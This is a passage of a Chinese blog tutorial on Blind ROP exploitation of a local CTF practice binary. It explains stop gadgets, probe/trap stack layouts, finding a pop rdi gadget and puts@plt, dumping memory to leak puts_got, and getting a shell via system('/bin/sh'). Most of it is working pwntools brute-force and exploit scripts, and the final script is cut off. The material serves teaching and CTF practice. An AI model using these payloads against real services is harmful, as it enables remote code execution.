c"><table><tr><td class="code"><pre><span class="line">ret</span><br><span class="line">xor eax,eax; ret</span><br></pre></td></tr></table></figure></li><li>probe, traps, stop, raps以这样的方式进行排列，可以看一下在栈中的排列<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">+---------------------------+ </span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           ....            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           stop            | &lt;----- stop gadget，不会使程序崩溃，作为probe的ret位</span><br><span class="line">+---------------------------+</span><br><span class="line">|          trap             | &lt;----- trap，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          probe            | &lt;----- 探针</span><br><span class="line">-----------------------------</span><br></pre></td></tr></table></figure>我们可以通过程序是否崩溃来判断probe探针中可能存在的汇编语句，在这样布局的情况下，如果程序没有崩溃，说明stop gadget被执行了。说明probe指针中仅存在一个pop操作，并且有ret返回，在probe探针中只有一个pop操作的时候才会只将probe后面的trap弹进寄存器，如果有两个及两个以上的pop操作的时候，stop gadget也会被弹进寄存器中无法执行。并且在probe探针中ret返回所指的位置是stop才能使程序不崩溃，如：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pop rax; ret</span><br><span class="line">pop rdi; ret</span><br></pre></td></tr></table></figure></li><li>probe, trap, trap, trap, trap, trap, trap, stop, traps以这样的方式进行排列，可以看一下在栈中的排列<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">+---------------------------+ </span><br><span class="line">|           traps           | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+ </span><br><span class="line">|           stop            | &lt;----- stop gadget，不会使程序崩溃，作为probe的ret位</span><br><span class="line">+---------------------------+ </span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- trap，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           probe           | &lt;----- 探针</span><br><span class="line">-----------------------------</span><br></pre></td></tr></table></figure>我们可以通过程序是否崩溃来判断probe探针中可能存在的汇编语句，在这样布局的情况下，如果程序没有崩溃，说明stop gadget被执行了。说明该probe探针中存在6个pop操作，并且有ret，因为只有在6个pop操作之后probe后面的trap才能弹进寄存器，之后sp指针才能指向stop gadget，这个时候stop gadget只有在ret位置才能被执行，因此程序不会崩溃<br>回到我们之间说的寻找brop gadget环节，我们这个环节要找的就是libc_csu_init最后的6个pop加ret，那么根据前面的讲解我们可以大致的通过trap、stop这种方式做一个简单的排列：<br>addr，trap, trap, trap, trap, trap, trap, stop, traps<br>以上面这种排列的话，addr通过循环不断增加地址位，只有addr所在地址拥有6个pop操作并ret的时候才会执行stopgadget。</li></ul><p><strong>循环内容：递增地址，找到可以执行6个pop和一个ret操作的gadget</strong><br><strong>循环终止条件：程序不崩溃，并出现起始的输出提示’WelCome’字符</strong><br><strong>执行目的：找到libc_csu_init函数的最后一个gadget，通过偏移计算出popr di地址</strong><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_brop_gadget</span>(<span class="params">length, stop_gadget, addr</span>): <span class="comment">#查找brop gadget函数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(stop_gadget) </span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="built_in">print</span> (content)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">b&#x27;WelCome&#x27;</span>):</span><br><span class="line">          <span class="comment">#判断提示符是否出现起始提示字符，如果有说明程序没崩溃</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_brop_gadget</span>(<span class="params">length, addr</span>):<span class="comment">#检查地址</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4005d0</span></span><br><span class="line">addr = <span class="number">0x4007b0</span> </span><br><span class="line"><span class="comment">#理论上应该从0x400000开始寻找，但是这个环节要找的是Libc_csu_init函数，所以大多数的libc中Libc_csu_init函数的起始地址都在0x400750之后，所以为了减少误差，从0x400750开始</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:  <span class="comment">#循环递增要测试的地址</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="built_in">hex</span>(addr))</span><br><span class="line">    <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;possible brop gadget: 0x%x&#x27;</span> % addr)</span><br><span class="line">        <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;success brop gadget: 0x%x&#x27;</span> % addr)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">1</span></span><br></pre></td></tr></table></figure><br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206210120.png" alt="Pasted image 20250206210120"></p><p>运行之后会得到很多的gadget地址，但是只有0x4007ba是可以继续进行操作的，如果想找到更多的gadget地址可以参考寻找stop gadget方法。<br>栈中布局</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0</span>           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |          .....           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0</span>           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       stop gadget        | stop gadget作为ret返回地址</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0</span>           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0</span>           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0</span>           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0</span>           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0</span>           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0</span>           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |         <span class="number">0x400740</span>+         | 递增地址覆盖原ret返回位置</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |             a             | a字符串覆盖原saved ebp位置</span><br><span class="line">      ebp---&gt;+---------------------------+</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |           ....            |        .....</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">ebp-？--&gt;+---------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在我们找到brop gadget之后加上0x09的偏移就可以得到pop rdi；ret操作的地址0x4007c3</p><h5 id="4-寻找puts-plt地址"><a href="#4-寻找puts-plt地址" class="headerlink" title="4.寻找puts@plt地址"></a>4.寻找puts@plt地址</h5><p>通过前面的操作，我们可以总结一些规律，比如我们需要什么就把他扔进循环递增，总会有一次循环会得到我们想要的结果，在上一步我们找到了pop rdi；ret这个gadget的地址了，那么我们就可以控制puts函数的输出内容。我们就需要用这个gadget找到puts_plt的地址<br>根据上面所说的如果我们调用puts函数，必须将puts函数的参数地址先部署进rdi寄存器中，然后调用puts函数将rdi中地址内的参数打印出来<br>但是由于开启了NX保护，所以我们无法在栈中部署外部的变量或者字符串，那么我们就需要一个程序内部的特殊字符串，并且这个字符串必须唯一的。这里介绍一下，在没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为’ \ x7fELF’</p><p><strong>循环内容：递增地址，找到可以进行打印的puts_plt地址</strong><br><strong>循环终止条件：接收字符串出现’\ x7fELF’字样</strong><br><strong>执行目的：为后续找到puts_got地址做准备</strong><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_puts_addr</span>(<span class="params">length, rdi_ret, stop_gadget</span>):</span><br><span class="line">    addr = <span class="number">0x400559</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">hex</span>(addr))</span><br><span class="line">        sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span> * length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(addr) + p64(stop_gadget)</span><br><span class="line"><span class="comment">#72个A填充栈空间，调用pop rdi；ret gadget将0x400000pop进rdi寄存器，循环增长的地址放在gadget的ret位置，在执行完gadget后直接调用循环增长的地址，如果增长到puts_plt地址就会打印rdi寄存器中地址内存放的字符串，最后的stop gadget是为了让程序不崩溃</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">if</span> content.startswith(<span class="string">b&#x27;\x7fELF&#x27;</span>):<span class="comment">#判断是否打印\x7fELF</span></span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&#x27;find puts@plt addr: 0x%x&#x27;</span> % addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line">rdi_ret = <span class="number">0x4007ba</span>+<span class="number">0x9</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4005d0</span></span><br><span class="line">puts = get_puts_addr(length,rdi_ret,stop_gadget)</span><br><span class="line"><span class="comment">#find puts@plt addr: 0x400565</span></span><br></pre></td></tr></table></figure><br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206211035.png" alt="Pasted image 20250206211035"><br>栈中布局</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">             +---------------------------+</span><br><span class="line">             |       stop gadget        | stop gadget确保程序不崩溃</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       <span class="number">0x400000</span>+        | 循环递增地址，作为pop的ret地址</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0x400000</span>        | ELF起始地址，地址内存放<span class="string">&#x27;、x7fELF&#x27;</span></span><br><span class="line">             +---------------------------+</span><br><span class="line">             |          <span class="number">0x4007c3</span>         | pop rdi；ret地址覆盖原ret返回位置</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |             a             | a字符串覆盖原saved ebp位置</span><br><span class="line">      ebp---&gt;+---------------------------+</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |           ....            |        .....</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">ebp-？--&gt;+---------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="5-泄露puts-got地址"><a href="#5-泄露puts-got地址" class="headerlink" title="5.泄露puts_got地址"></a>5.泄露puts_got地址</h5><p>在得到puts_plt地址后，接下来就需要将puts_got地址泄露出来，得到puts_got地址之后就可以利用LibcSearcher查找对应的libc版本，再根据版本找到libc中的system函数和/bin/sh</p><p>在泄露之前需要知道一下Linux中plt表和got表的关系，我们就拿puts函数举例<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+--------------+</span><br><span class="line">|    GOT表     |</span><br><span class="line">+---------------------+   +--------------+找到真实地址   +--------------+</span><br><span class="line">|  PLT表  | jmp got表  |-----&gt; |puts的真实地址 | -------------&gt;|    puts函数   |</span><br><span class="line">+---------------------+   +--------------+  +--------------+</span><br><span class="line">跳转到got表中存放puts              |              |</span><br><span class="line"> 函数真实地址的地址          | |</span><br><span class="line"> |  |</span><br><span class="line"> |         |</span><br><span class="line"> |     |</span><br><span class="line"> +--------------+</span><br></pre></td></tr></table></figure><br>我们可以根据上图我们模拟一下call puts的过程，在执行call puts之后程序首先会在PLT表中寻找puts_plt的地址，那么在puts_plt地址中存放的是GOT表中存放puts函数真实地址的地址，接下来会在GOT表中找到存放puts真实地址的地址，接下来打开盒子根据真实找到了puts函数<br>在ret2csu中我们使用的是LibcSearcher查找的函数got表地址，那么由于这道题开启了ASLR，所以不能使用工具去获取地址，那么我们手动的去找，找的就是在puts_plt地址中存放的jmp指令后接的地址。如果觉得不懂，看一下上面的图，jmp指令后面接的就是puts_got的地址。由于不能实用工具，我们只能手动的讲整个PLT部分都dump出来。dump出来的文件重新设置基地址0x400000，再根据前面得到的puts_plt地址找到对应位置，查看该地址内的汇编指令<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dump the bin file</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">length, rdi_ret, puts_plt, leak_addr, stop_gadget</span>):</span><br><span class="line">    sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)</span><br><span class="line"><span class="comment">#72个a填满栈空间至ret位置，后接pop rdi；ret gadget，循环递增的地址被pop进rdi寄存器，接下来将puts_plt地址防止在gadget ret位置进行调用打印循环递增的地址，最后加上stop gadget防止崩溃</span></span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = sh.recv(timeout=<span class="number">0.1</span>)</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data[:data.index(<span class="string">b&quot;\nWelCome&quot;</span>)]<span class="comment">#将接收的\nWelCome之前的字符串交给data变量</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = data</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">b&quot;&quot;</span>: <span class="comment">#如果data被赋值之后为空，那么就说明已经完成整个dump过程，添加\x00截断</span></span><br><span class="line">            data = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4005d0</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400565</span></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line">result = <span class="string">b&quot;&quot;</span> <span class="comment">#准备一个空字符串接收dump出来的代码</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:   <span class="comment">#从0x400000开始泄露0x1000个字节，足以包含程序的plt部分</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="built_in">hex</span>(addr))</span><br><span class="line">    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>: <span class="comment">#判断接收字符是否为空</span></span><br><span class="line">        result += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        addr +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += data <span class="comment">#接收字符串</span></span><br><span class="line">    addr += <span class="built_in">len</span>(data)  <span class="comment">#addr+接收字符串个数，避免接收重复的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment">#在当前目录下以二进制形式向hollk文件中写</span></span><br><span class="line">    f.write(result)</span><br></pre></td></tr></table></figure><br>个文件就是我们dump出来的文件，其实你可以把他比作Windows下脱壳之后的文件。虽然在实际情况下我们看不到二进制文件，但是我们dump出来的plt段的内容可以使用IDA进行查看。将dump文件拖进64位IDA，选择binary File形式打开，选择64-bit mode<br>接下来需要给dump文件设置基地址，因为我们是从0x400000处开始dump的，所以基地址就设为0x400000<br>设置步骤：edit-&gt;segments-&gt;rebase program 将程序的基地址改为 0x400000<br>由于我们之前找到了puts函数的plt地址0x400560，所以我们找到偏移0x560处<br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206220625.png" alt="Pasted image 20250206220625"></p><h5 id="6-查询libc版本"><a href="#6-查询libc版本" class="headerlink" title="6.查询libc版本"></a>6.查询libc版本</h5><p><a href="https://libc.blukat.me/">libc database search</a><br>这里我们直接调用本地的就行</p><h5 id="7-getshell"><a href="#7-getshell" class="headerlink" title="7.getshell"></a>7.getshell</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4005d0</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400565</span></span><br><span class="line"><span class="comment">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">ret = brop_gadget + <span class="number">9</span> + <span class="number">1</span></span><br><span class="line">sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">puts_addr =u64(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(ret) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>成功get shell<br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206224413.png" alt="Pasted image 20250206224413"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#1.暴力枚举出栈溢出长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getsize</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">            p.send(i*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data.startswith(<span class="string">b&#x27;No password&#x27;</span>):</span><br><span class="line">                <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:<span class="comment">#主要探测是否具有canary</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line"> </span><br><span class="line">size = getsize()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;size is : %s &quot;</span>% size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_stop</span>():</span><br><span class="line">    addr = <span class="number">0x4005cf</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Now,trying the address is &quot;</span>,<span class="built_in">hex</span>(addr))</span><br><span class="line">            p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">            payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span> + p64(addr)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Now,the payload is &quot;</span>,payload)</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;WelCome&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;main funciton--&gt;[%s]&quot;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&#x27;one success addr : 0x%x&#x27;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;a bad addr&quot;</span>,<span class="built_in">hex</span>(addr))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Can&#x27;t connect,retrying&quot;</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">data = get_stop()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Success,call Main Function address is&quot;</span>,<span class="built_in">hex</span>(data))</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#3</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_brop_gadget</span>(<span class="params">length, stop_gadget, addr</span>): <span class="comment">#查找brop gadget函数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(stop_gadget) </span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="built_in">print</span> (content)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">b&#x27;WelCome&#x27;</span>):</span><br><span class="line">          <span class="comment">#判断提示符是否出现起始提示字符，如果有说明程序没崩溃</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_brop_gadget</span>(<span class="params">length, addr</span>):<span class="comment">#检查地址</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#4</span></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4005d0</span></span><br><span class="line">addr = <span class="number">0x4007b0</span> </span><br><span class="line"><span class="comment">#理论上应该从0x400000开始寻找，但是这个环节要找的是Libc_csu_init函数，所以大多数的libc中Libc_csu_init函数的起始地址都在0x400740之后，所以为了减少误差，从0x400740开始</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:  <span class="comment">#循环递增要测试的地址</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="built_in">hex</span>(addr))</span><br><span class="line">    <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;possible brop 